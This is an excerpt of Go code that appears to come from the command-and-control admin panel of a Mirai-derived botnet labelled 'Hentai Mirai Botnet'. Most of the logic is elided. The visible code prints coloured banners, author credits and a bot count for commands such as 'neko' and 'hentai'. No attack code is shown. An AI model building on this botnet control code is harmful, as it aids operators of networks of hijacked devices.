...
func (this *Admin) Handle() {
    ...
    this.conn.Write([]byte("\033[01;35m            ║\033[01;37m- - - - - - \033[38;5;93mDeveloped By \033[01;35m@Reborn <3 \033[01;37m- - - - - -\033[01;35m║    \x1b[0m \r\n"))
    ...
    for {
        ...
        if err != nil || cmd == "neko" {
            ...
            this.conn.Write([]byte("\x1b[1;95m                           Made By - Reborn.Shad0w <3                         \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                                               \r\n\x1b[0m"))
            continue
        }
        ...
        if err != nil || cmd == "quote" {
            ...
            this.conn.Write([]byte("\033[0;31m       ( () )                      \x1b[0;31m -\x1b[0;33mReborn<3      \x1b[0;31m ( () )   \r\n"))
            this.conn.Write([]byte("\033[0;31m        \\  /                                         \\  /   \r\n"))
            this.conn.Write([]byte("\033[0;31m         \\/                                           \\/   \r\n"))
            continue
        }
        ...
        if err != nil || cmd == "mickey" {
            ...
            this.conn.Write([]byte("\033[1;90m           \033[01;35mMana \033[1;90mby \033[95mReborn.Shad0w <3             \033[97m``'????$$b;\033[90m:::::::d$$$$$c`\033[38;5;216m?$$$$$$$$F u($$$$$>\033[90m.:'    `'''`                 \r\n"))
        ...
        if err != nil || cmd == "saikin" {
            ...
            this.conn.Write([]byte("\033[1;30m         This Net is Owned by Reborn.Shad0w\r\n\033[0m"))
            this.conn.Write([]byte("\033[1;35m\r\n"))
        ...
        if err != nil || cmd == "hentai" {
            ...
            this.conn.Write([]byte("\r\x1b[0;95m               [\x1b[0;31m+\x1b[0;96m] Hentai Mirai Botnet - Created By Reborn.Shad0w [\x1b[0;31m+\x1b[0;95m]        \r\n"))
            this.conn.Write([]byte("\r\x1b[0;95m         \r\n"))
            this.conn.Write([]byte("\r\n\033[0m"))
            continue
        }
        ...
        botCount = clientList.Count()
            ...
            this.conn.Write([]byte(fmt.Sprintf("\033[01;35m  \033[01;37mDeveloped By \033[01;35m@Reborn.Shad0w <3                 \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;35m ═══════════════════════════════  \r\n")))
            continue
        }
